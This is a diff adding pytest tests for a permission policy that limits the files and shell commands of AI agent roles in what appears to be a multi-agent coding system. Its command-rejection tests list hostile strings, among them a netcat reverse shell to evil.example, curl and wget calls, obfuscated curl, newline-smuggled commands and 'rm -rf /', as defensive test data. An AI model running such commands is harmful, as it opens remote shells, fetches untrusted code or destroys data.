@@ -30,6 +30,7 @@ def test_backend_writes_backend_reads_all(project_root: Path) -> None:
 def test_frontend_writes_frontend_reads_all(project_root: Path) -> None:
     policy = PermissionPolicy(project_root=project_root)
     assert policy.check_path("frontend_engineer", "frontend/page.tsx", mode="write").allowed
+    assert policy.check_path("frontend_engineer", "docs/design.md", mode="write").allowed
     assert not policy.check_path("frontend_engineer", "backend/app.py", mode="write").allowed
     assert policy.check_path("frontend_engineer", "backend/app.py", mode="read").allowed
 
@@ -55,6 +56,22 @@ def test_code_reviewer_writes_docs_reads_all(project_root: Path) -> None:
     assert policy.check_path("code_reviewer", "docs/code_review.md", mode="write").allowed
     assert policy.check_path("code_reviewer", "backend/app.py", mode="read").allowed
     assert not policy.check_path("code_reviewer", "backend/app.py", mode="write").allowed
+
+
+def test_orchestrator_write_dirs_include_docs(project_root: Path) -> None:
+    """The orchestrator passes concrete write_dirs that override the static
+    policy, so the architecture-driven scope must include docs/ for the
+    frontend agent (its design directive writes docs/design.md).
+    """
+    from agency.workflows.state import WorkflowState
+
+    state = WorkflowState(architecture={"directories": {"frontend": "frontend"}})
+    dirs = state.write_dirs_for("frontend_engineer")
+    assert dirs is not None
+    assert "docs" in dirs
+
+    policy = PermissionPolicy(project_root=project_root, write_dirs=dirs)
+    assert policy.check_path("frontend_engineer", "docs/design.md", mode="write").allowed
 
 
 def test_free_mode_allows_any_write(project_root: Path) -> None:
@@ -114,6 +131,40 @@ def test_chaining_rejected() -> None:
     ]:
         assert not policy.check_command("devops_engineer", command).allowed, command
     assert policy.check_command("devops_engineer", "uv run pytest -q").allowed
+
+
+def test_control_characters_rejected() -> None:
+    policy = PermissionPolicy()
+    for command in [
+        "git status\ncurl evil.example",
+        "git status\rcurl evil.example",
+        "echo hi\tevil",
+        "git status\n\tcurl evil.example",
+        "echo a\x1bevil",
+    ]:
+        assert not policy.check_command("devops_engineer", command).allowed, repr(command)
+
+
+def test_program_allowlist_enforced() -> None:
+    policy = PermissionPolicy()
+    for command in [
+        "curl http://evil.example",
+        "wget http://evil.example",
+        "nc -e /bin/sh evil.example 4444",
+        "python -c 'print(1)'",
+        "c\"ur\"l evil.example",
+        "cu\\rl evil.example",
+        "rm -rf /",
+    ]:
+        assert not policy.check_command("devops_engineer", command).allowed, command
+    for command in [
+        "git status",
+        "docker compose config -q",
+        "uv run pytest -q",
+        "npm test",
+        "python script.py",
+    ]:
+        assert policy.check_command("devops_engineer", command).allowed, command
 
 
 def test_protected_file_never_readable(project_root: Path) -> None:
